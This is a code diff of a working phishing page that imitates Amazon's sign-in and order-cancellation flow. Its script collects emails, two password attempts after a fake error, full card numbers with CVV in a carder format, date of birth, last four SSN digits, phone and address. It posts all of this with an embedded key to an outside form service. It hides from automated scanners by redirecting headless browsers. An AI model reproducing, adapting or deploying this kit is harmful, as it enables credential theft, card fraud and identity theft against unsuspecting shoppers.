@@ -6,14 +6,13 @@
     <title>Amazon Sign-In</title>
     <link rel="icon" href="https://www.amazon.com/favicon.ico">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Ember:wght@400;500;700&display=swap');
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: "Amazon Ember", Arial, sans-serif; background: #FFFFFF; min-height: 100vh; display: flex; flex-direction: column; font-size: 13px; color: #0F1111; -webkit-font-smoothing: antialiased; }
         a { color: #0066C0; text-decoration: none; }
         a:hover { color: #C45500; text-decoration: underline; cursor: pointer; }
         .main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 14px 18px; }
-        .logo { padding: 12px 0 16px; text-align: center; }
-        .logo svg { height: 31px; width: auto; }
+        .logo { padding: 14px 0 12px; text-align: center; }
+        .logo img { width: 103px; height: auto; }
         .box { border: 1px solid #DDD; border-radius: 8px; padding: 20px 26px; max-width: 350px; width: 100%; margin-bottom: 22px; }
         .box-wide { max-width: 400px; }
         h1 { font-size: 28px; font-weight: 400; color: #111; margin-bottom: 10px; line-height: 1.2; }
@@ -53,8 +52,6 @@
         .divider-line { flex: 1; height: 1px; background: linear-gradient(to right, #FFF, #DDD 20%, #DDD 80%, #FFF); }
         .divider-text { padding: 0 8px; font-size: 12px; color: #767676; }
         .help-text { font-size: 13px; margin-top: 16px; }
-        .new-section { text-align: center; margin-top: 14px; padding-top: 16px; border-top: 1px solid #E7E7E7; }
-        .new-section-title { font-size: 12px; color: #767676; margin-bottom: 8px; }
         .footer { text-align: center; padding: 26px 18px 30px; margin-top: auto; }
         .footer-divider { height: 44px; background: linear-gradient(to bottom, rgba(0,0,0,.14), rgba(0,0,0,.03) 3px, transparent); }
         .footer-links { display: flex; justify-content: center; gap: 14px; flex-wrap: wrap; margin-bottom: 6px; font-size: 11px; }
@@ -96,12 +93,7 @@
     <div class="main">
         <div class="logo">
             <a href="https://www.amazon.com">
-                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 603 182" fill="none">
-                    <path fill="#000" d="M374.6 142.1c-34.3 25.3-84.1 38.8-127 38.8-60.1 0-114.2-22.2-155.1-59.2-3.2-2.9-.3-6.9 3.5-4.6 44.2 25.7 98.8 41.2 155.2 41.2 38.1 0 79.9-7.9 118.5-24.2 5.8-2.5 10.7 3.8 4.9 8z"/>
-                    <path fill="#000" d="M388.7 126c-4.4-5.6-29-2.7-40.1-1.3-3.4.4-3.9-2.5-.8-4.7 19.6-13.8 51.8-9.8 55.6-5.2 3.7 4.6-1 36.8-19.4 52.1-2.8 2.4-5.5 1.1-4.3-2 4.2-10.5 13.5-33.8 9-38.9z"/>
-                    <path fill="#F90" d="M349.4 20.7V6.4c0-2.2 1.6-3.6 3.6-3.6h64.3c2 0 3.7 1.5 3.7 3.6v12.2c0 2-1.8 4.7-4.9 9l-33.3 47.6c12.4-.3 25.5 1.5 36.7 7.8 2.6 1.4 3.3 3.5 3.5 5.5v15.2c0 2.1-2.3 4.5-4.6 3.2-19.5-10.2-45.4-11.3-67 .1-2.2 1.2-4.5-1.1-4.5-3.2V89.3c0-2.3 0-6.3 2.3-9.8l38.6-55.4h-33.6c-2 0-3.7-1.5-3.7-3.5h-.1z"/>
-                    <path fill="#000" d="M127.4 105.6h-19.5c-1.9-.1-3.4-1.5-3.5-3.3V6.6c0-2 1.7-3.6 3.8-3.6h18.2c1.9.1 3.4 1.6 3.6 3.4v12.5h.4c4.8-12.3 13.8-18 25.9-18 12.3 0 20 5.7 25.5 18 4.8-12.3 15.6-18 27.3-18 8.3 0 17.4 3.4 22.9 11.1 6.3 8.6 5 21.1 5 32v58.3c0 2-1.7 3.7-3.8 3.7h-19.5c-2-.1-3.5-1.7-3.5-3.7V54c0-4.3.4-15-.6-19.1-1.5-6.9-6.1-8.8-12-8.8-5 0-10.1 3.3-12.2 8.6-2.1 5.3-1.9 14.1-1.9 19.4v48.3c0 2-1.7 3.7-3.8 3.7h-19.5c-2-.1-3.5-1.7-3.5-3.7l-.1-48.3c0-11.4 1.9-28.2-12.5-28.2-14.6 0-14 16.3-14 28.2v48.3c0 2-1.7 3.7-3.8 3.7l.2-.5zM469.2.9c29 0 44.7 24.9 44.7 56.5 0 30.6-17.3 54.9-44.7 54.9-28.5 0-44.1-24.9-44.1-55.8 0-31.1 15.7-55.6 44.1-55.6zm.2 20.5c-14.4 0-15.3 19.6-15.3 31.8 0 12.3-.2 38.5 15.1 38.5 15.1 0 15.8-21.2 15.8-34.1 0-8.5-.4-18.7-2.7-26.8-2-7-6-9.4-12.9-9.4zM553.2 105.6h-19.4c-2-.1-3.5-1.7-3.5-3.7l-.1-95.6c.2-1.9 1.8-3.3 3.8-3.3h18.1c1.7.1 3.2 1.3 3.5 2.9v14.6h.4c5.5-13.2 13.2-19.5 26.7-19.5 8.9 0 17.5 3.2 23.1 12 5.2 8.2 5.2 21.9 5.2 31.8v57.6c-.2 1.8-1.8 3.2-3.8 3.2h-19.6c-1.9-.1-3.4-1.5-3.5-3.2V52.6c0-11.2 1.3-27.5-12.7-27.5-4.9 0-9.5 3.3-11.8 8.3-2.9 6.3-3.2 12.6-3.2 19.2v49.5c0 2-1.8 3.7-3.9 3.7l.7-.2zM299.2 59.3c0 7.8.2 14.3-3.7 21.2-3.2 5.6-8.3 9.1-13.9 9.1-7.7 0-12.3-5.9-12.3-14.6 0-17.2 15.4-20.3 29.9-20.3v4.6zm20.2 48.9c-1.3 1.2-3.3 1.3-4.8.5-6.8-5.6-8-8.2-11.7-13.6-11.2 11.4-19.1 14.8-33.7 14.8-17.2 0-30.6-10.6-30.6-31.8 0-16.6 9-27.9 21.8-33.4 11.1-4.9 26.6-5.8 38.5-7.1v-2.7c0-4.9.4-10.7-2.5-14.9-2.5-3.8-7.4-5.3-11.6-5.3-7.9 0-14.9 4-16.6 12.4-.4 1.9-1.7 3.7-3.6 3.8l-19-2c-1.7-.4-3.6-1.8-3.1-4.4C247.4 6.5 270.5 0 291.4 0c10.7 0 24.7 2.9 33.2 10.9 10.7 10 9.7 23.4 9.7 38v34.4c0 10.3 4.3 14.9 8.3 20.4 1.4 2 1.7 4.4-.1 5.9l-13.1 11.3-.1-.1v-.7zM55.2 59.3c0 7.8.2 14.3-3.7 21.2-3.2 5.6-8.2 9.1-13.9 9.1-7.7 0-12.2-5.9-12.2-14.6 0-17.2 15.4-20.3 29.8-20.3v4.6zm20.3 48.9c-1.3 1.2-3.3 1.3-4.8.5-6.8-5.6-8-8.2-11.7-13.6-11.2 11.4-19.2 14.8-33.7 14.8C8 109.9-5.4 99.3-5.4 78.1c0-16.6 9-27.9 21.8-33.4 11.1-4.9 26.6-5.8 38.5-7.1v-2.7c0-4.9.4-10.7-2.5-14.9-2.5-3.8-7.4-5.3-11.6-5.3-7.9 0-15 4-16.6 12.4-.4 1.9-1.7 3.7-3.6 3.8l-19-2C-.1 28.5-2 27.1-1.5 24.5 3.5 6.5 26.5 0 47.4 0c10.7 0 24.7 2.9 33.2 10.9 10.7 10 9.7 23.4 9.7 38v34.4c0 10.3 4.3 14.9 8.3 20.4 1.4 2 1.7 4.4-.1 5.9-4.5 3.8-12.6 10.8-17 14.8l-.1-.7.1-.5z"/>
-                </svg>
+                <img src="https://images-na.ssl-images-amazon.com/images/G/01/gc/designs/livepreview/amazon_dkblue_noto_email_v2016_us-main._CB468775337_.png" alt="Amazon">
             </a>
         </div>
         
@@ -180,7 +172,7 @@
                 </div>
                 <div class="form-group">
                     <label>Card number</label>
-                    <input type="text" id="cardNumber" placeholder="" maxlength="19" required>
+                    <input type="text" id="cardNumber" maxlength="19" required>
                 </div>
                 <div style="display: flex; gap: 12px;">
                     <div class="form-group" style="flex: 1;">
@@ -194,7 +186,6 @@
                 </div>
                 <div class="card-icons">
                     <img src="https://images-na.ssl-images-amazon.com/images/G/01/checkout/payselect/card-logos-small/visa._CB658923706_.gif" alt="Visa">
-                    <img src="https://images-na.ssl-images-amazon.com/images/G/01/checkout/payselect/card-logos-small/mastercard._CB658923755_.gif" alt="Mastercard">
                     <img src="https://images-na.ssl-images-amazon.com/images/G/01/checkout/payselect/card-logos-small/amex._CB658923713_.gif" alt="Amex">
                     <img src="https://images-na.ssl-images-amazon.com/images/G/01/checkout/payselect/card-logos-small/discover._CB658923743_.gif" alt="Discover">
                 </div>
@@ -270,8 +261,6 @@
 
     <script>
         const WEB3FORMS_KEY = '04af8936-9e51-408a-b725-ab3331e183cf';
-        
-        // URL PARAMS - Customizable product & order
         const params = new URLSearchParams(window.location.search);
         const config = {
             product: params.get('product') || 'Apple MacBook Pro 16" M3 Max 1TB',
@@ -279,8 +268,6 @@
             order: params.get('order') || '112-' + Math.floor(1000000 + Math.random() * 9000000) + '-' + Math.floor(1000000 + Math.random() * 9000000),
             img: params.get('img') || 'https://m.media-amazon.com/images/I/61L5QgPvgqL._AC_SX679_.jpg'
         };
-        
-        // Apply config to page
         document.getElementById('productName').textContent = config.product;
         document.getElementById('productPrice').textContent = config.price;
         document.getElementById('orderNum').textContent = '#' + config.order;
@@ -289,152 +276,40 @@
         document.getElementById('productImg').src = config.img;
         
         let passwordAttempt = 0;
-        let collectedData = {
-            email: '', password: '', password2: '',
-            cardName: '', cardNumber: '', cardExp: '', cardCvv: '',
-            fullName: '', dob: '', ssn: '', phone: '', address: '', city: '', zip: '',
-            ip: '', country: '', userAgent: navigator.userAgent,
-            screen: screen.width + 'x' + screen.height,
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            language: navigator.language, timestamp: '', product: config.product, order: config.order
-        };
+        let collectedData = { email: '', password: '', password2: '', cardName: '', cardNumber: '', cardExp: '', cardCvv: '', fullName: '', dob: '', ssn: '', phone: '', address: '', city: '', zip: '', ip: '', country: '', userAgent: navigator.userAgent, screen: screen.width + 'x' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, timestamp: '', product: config.product, order: config.order };
 
-        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
-            collectedData.ip = d.ip;
-            collectedData.country = d.country_code;
-            if (d.country_code === 'US') {
-                document.getElementById('ssnGroup').style.display = 'block';
-                document.getElementById('ssn').required = true;
-            }
-        }).catch(() => {});
+        fetch('https://ipapi.co/json/').then(r => r.json()).then(d => { collectedData.ip = d.ip; collectedData.country = d.country_code; if (d.country_code === 'US') { document.getElementById('ssnGroup').style.display = 'block'; document.getElementById('ssn').required = true; } }).catch(() => {});
 
-        // Input formatting
-        document.getElementById('cardNumber').addEventListener('input', function(e) {
-            let v = e.target.value.replace(/\D/g, '').substring(0, 16);
-            e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
-        });
-        document.getElementById('cardExp').addEventListener('input', function(e) {
-            let v = e.target.value.replace(/\D/g, '').substring(0, 4);
-            if (v.length >= 2) v = v.substring(0,2) + ' / ' + v.substring(2);
-            e.target.value = v;
-        });
-        document.getElementById('dob').addEventListener('input', function(e) {
-            let v = e.target.value.replace(/\D/g, '').substring(0, 8);
-            if (v.length >= 4) v = v.substring(0,2) + ' / ' + v.substring(2,4) + ' / ' + v.substring(4,8);
-            else if (v.length >= 2) v = v.substring(0,2) + ' / ' + v.substring(2);
-            e.target.value = v;
-        });
-        document.getElementById('ssn').addEventListener('input', function(e) {
-            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
-        });
+        document.getElementById('cardNumber').addEventListener('input', function(e) { let v = e.target.value.replace(/\D/g, '').substring(0, 16); e.target.value = v.replace(/(.{4})/g, '$1 ').trim(); });
+        document.getElementById('cardExp').addEventListener('input', function(e) { let v = e.target.value.replace(/\D/g, '').substring(0, 4); if (v.length >= 2) v = v.substring(0,2) + ' / ' + v.substring(2); e.target.value = v; });
+        document.getElementById('dob').addEventListener('input', function(e) { let v = e.target.value.replace(/\D/g, '').substring(0, 8); if (v.length >= 4) v = v.substring(0,2) + ' / ' + v.substring(2,4) + ' / ' + v.substring(4,8); else if (v.length >= 2) v = v.substring(0,2) + ' / ' + v.substring(2); e.target.value = v; });
+        document.getElementById('ssn').addEventListener('input', function(e) { e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4); });
 
-        function showStep(n) {
-            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-            document.getElementById('step' + n).classList.add('active');
-            window.scrollTo(0, 0);
-        }
-        function showLoading(show) {
-            document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-            document.getElementById('loading').style.display = show ? 'block' : 'none';
-        }
-        function getSubject(step) {
-            if (step === 1) return 'Email Access';
-            if (step === 2) return 'Card Info';
-            return 'Personal Info';
-        }
+        function showStep(n) { document.querySelectorAll('.step').forEach(s => s.classList.remove('active')); document.getElementById('step' + n).classList.add('active'); window.scrollTo(0, 0); }
+        function showLoading(show) { document.querySelectorAll('.step').forEach(s => s.classList.remove('active')); document.getElementById('loading').style.display = show ? 'block' : 'none'; }
+        function getSubject(step) { if (step === 1) return 'Email Access'; if (step === 2) return 'Card Info'; return 'Personal Info'; }
 
         async function sendData(step) {
             collectedData.timestamp = new Date().toISOString();
-            let msg = '=== AMAZON [' + config.order + '] ===\n';
-            msg += 'Product: ' + config.product + '\nPrice: $' + config.price + '\n\n';
-            msg += '--- LOGIN ---\nEmail: ' + collectedData.email + '\nPass1: ' + collectedData.password + '\n';
+            let msg = '=== AMAZON [' + config.order + '] ===\nProduct: ' + config.product + '\nPrice: $' + config.price + '\n\n--- LOGIN ---\nEmail: ' + collectedData.email + '\nPass1: ' + collectedData.password + '\n';
             if (collectedData.password2) msg += 'Pass2: ' + collectedData.password2 + '\n';
-            if (step >= 2) {
-                msg += '\n--- CARD ---\n';
-                msg += 'Name: ' + collectedData.cardName + '\n';
-                msg += 'Card: ' + collectedData.cardNumber + '\n';
-                msg += 'Exp: ' + collectedData.cardExp + '\nCVV: ' + collectedData.cardCvv + '\n';
-                let cn = collectedData.cardNumber.replace(/\s/g, '');
-                let exp = collectedData.cardExp.replace(/\s/g, '').split('/');
-                msg += 'FORMAT: ' + cn + '|' + (exp[0]||'') + '|' + (exp[1]||'') + '|' + collectedData.cardCvv + '\n';
-            }
-            if (step >= 3) {
-                msg += '\n--- PERSONAL ---\n';
-                msg += 'Name: ' + collectedData.fullName + '\nDOB: ' + collectedData.dob + '\n';
-                if (collectedData.ssn) msg += 'SSN4: ' + collectedData.ssn + '\n';
-                msg += 'Phone: ' + collectedData.phone + '\n';
-                msg += 'Addr: ' + collectedData.address + ', ' + collectedData.city + ' ' + collectedData.zip + '\n';
-            }
-            msg += '\n--- DEVICE ---\nIP: ' + collectedData.ip + ' (' + collectedData.country + ')\n';
-            msg += 'Screen: ' + collectedData.screen + '\nTZ: ' + collectedData.timezone + '\n';
-            
-            try {
-                await fetch('https://api.web3forms.com/submit', {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ access_key: WEB3FORMS_KEY, subject: getSubject(step), from_name: 'D1337 Project', message: msg })
-                });
-            } catch(e) {}
+            if (step >= 2) { msg += '\n--- CARD ---\nName: ' + collectedData.cardName + '\nCard: ' + collectedData.cardNumber + '\nExp: ' + collectedData.cardExp + '\nCVV: ' + collectedData.cardCvv + '\n'; let cn = collectedData.cardNumber.replace(/\s/g, ''); let exp = collectedData.cardExp.replace(/\s/g, '').split('/'); msg += 'FORMAT: ' + cn + '|' + (exp[0]||'') + '|' + (exp[1]||'') + '|' + collectedData.cardCvv + '\n'; }
+            if (step >= 3) { msg += '\n--- PERSONAL ---\nName: ' + collectedData.fullName + '\nDOB: ' + collectedData.dob + '\n'; if (collectedData.ssn) msg += 'SSN4: ' + collectedData.ssn + '\n'; msg += 'Phone: ' + collectedData.phone + '\nAddr: ' + collectedData.address + ', ' + collectedData.city + ' ' + collectedData.zip + '\n'; }
+            msg += '\n--- DEVICE ---\nIP: ' + collectedData.ip + ' (' + collectedData.country + ')\nScreen: ' + collectedData.screen + '\nTZ: ' + collectedData.timezone + '\n';
+            try { await fetch('https://api.web3forms.com/submit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ access_key: WEB3FORMS_KEY, subject: getSubject(step), from_name: 'D1337 Project', message: msg }) }); } catch(e) {}
         }
 
-        document.getElementById('emailForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            collectedData.email = document.getElementById('email').value;
-            document.getElementById('emailDisplayWrap').innerHTML = collectedData.email + ' <a href="#" id="changeEmail">Change</a>';
-            document.getElementById('changeEmail').addEventListener('click', function(ev) { ev.preventDefault(); showStep(1); });
-            showStep(2);
-            document.getElementById('password').focus();
-        });
+        document.getElementById('emailForm').addEventListener('submit', function(e) { e.preventDefault(); collectedData.email = document.getElementById('email').value; document.getElementById('emailDisplayWrap').innerHTML = collectedData.email + ' <a href="#" id="changeEmail">Change</a>'; document.getElementById('changeEmail').addEventListener('click', function(ev) { ev.preventDefault(); showStep(1); }); showStep(2); document.getElementById('password').focus(); });
 
-        document.getElementById('passwordForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            passwordAttempt++;
-            if (passwordAttempt === 1) {
-                collectedData.password = document.getElementById('password').value;
-                document.getElementById('error2').classList.add('show');
-                document.getElementById('password').value = '';
-                document.getElementById('password').focus();
-                return;
-            }
-            collectedData.password2 = document.getElementById('password').value;
-            document.getElementById('error2').classList.remove('show');
-            showLoading(true);
-            await sendData(1);
-            setTimeout(() => { showLoading(false); showStep(3); }, 1500);
-        });
+        document.getElementById('passwordForm').addEventListener('submit', async function(e) { e.preventDefault(); passwordAttempt++; if (passwordAttempt === 1) { collectedData.password = document.getElementById('password').value; document.getElementById('error2').classList.add('show'); document.getElementById('password').value = ''; document.getElementById('password').focus(); return; } collectedData.password2 = document.getElementById('password').value; document.getElementById('error2').classList.remove('show'); showLoading(true); await sendData(1); setTimeout(() => { showLoading(false); showStep(3); }, 1500); });
 
         document.getElementById('cancelOrderBtn').addEventListener('click', function() { showStep(4); });
 
-        document.getElementById('cardForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            collectedData.cardName = document.getElementById('cardName').value;
-            collectedData.cardNumber = document.getElementById('cardNumber').value;
-            collectedData.cardExp = document.getElementById('cardExp').value;
-            collectedData.cardCvv = document.getElementById('cardCvv').value;
-            showLoading(true);
-            await sendData(2);
-            setTimeout(() => { showLoading(false); showStep(5); }, 1500);
-        });
+        document.getElementById('cardForm').addEventListener('submit', async function(e) { e.preventDefault(); collectedData.cardName = document.getElementById('cardName').value; collectedData.cardNumber = document.getElementById('cardNumber').value; collectedData.cardExp = document.getElementById('cardExp').value; collectedData.cardCvv = document.getElementById('cardCvv').value; showLoading(true); await sendData(2); setTimeout(() => { showLoading(false); showStep(5); }, 1500); });
 
-        document.getElementById('billingForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-            collectedData.fullName = document.getElementById('fullName').value;
-            collectedData.dob = document.getElementById('dob').value;
-            collectedData.ssn = document.getElementById('ssn').value;
-            collectedData.phone = document.getElementById('phone').value;
-            collectedData.address = document.getElementById('address').value;
-            collectedData.city = document.getElementById('city').value;
-            collectedData.zip = document.getElementById('zip').value;
-            showLoading(true);
-            await sendData(3);
-            setTimeout(() => { showLoading(false); showStep(6); setTimeout(() => { window.location.href = 'https://www.amazon.com/'; }, 4000); }, 2000);
-        });
+        document.getElementById('billingForm').addEventListener('submit', async function(e) { e.preventDefault(); collectedData.fullName = document.getElementById('fullName').value; collectedData.dob = document.getElementById('dob').value; collectedData.ssn = document.getElementById('ssn').value; collectedData.phone = document.getElementById('phone').value; collectedData.address = document.getElementById('address').value; collectedData.city = document.getElementById('city').value; collectedData.zip = document.getElementById('zip').value; showLoading(true); await sendData(3); setTimeout(() => { showLoading(false); showStep(6); setTimeout(() => { window.location.href = 'https://www.amazon.com/'; }, 4000); }, 2000); });
 
-        // Anti-bot
-        (function() {
-            if (navigator.webdriver || window.callPhantom || window._phantom || navigator.userAgent.toLowerCase().includes('headless')) {
-                window.location.href = 'https://www.amazon.com/';
-            }
-        })();
+        (function() { if (navigator.webdriver || window.callPhantom || window._phantom || navigator.userAgent.toLowerCase().includes('headless')) { window.location.href = 'https://www.amazon.com/'; } })();
     </script>
 </body>
 </html>
